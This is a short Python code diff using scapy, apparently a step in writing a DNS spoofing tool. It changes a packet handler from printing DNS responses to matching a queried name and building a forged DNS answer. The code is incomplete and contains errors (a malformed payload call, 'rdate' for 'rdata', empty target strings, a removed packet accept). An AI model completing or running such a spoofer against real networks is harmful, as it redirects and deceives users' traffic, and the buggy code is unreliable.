@@ -5,8 +5,10 @@ import scapy.all as scapy
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get.payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
-    packet.accept()
+        qname = scapy_packet(scapy.DNSQR).qname
+        if "" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdate="")
 
 
 
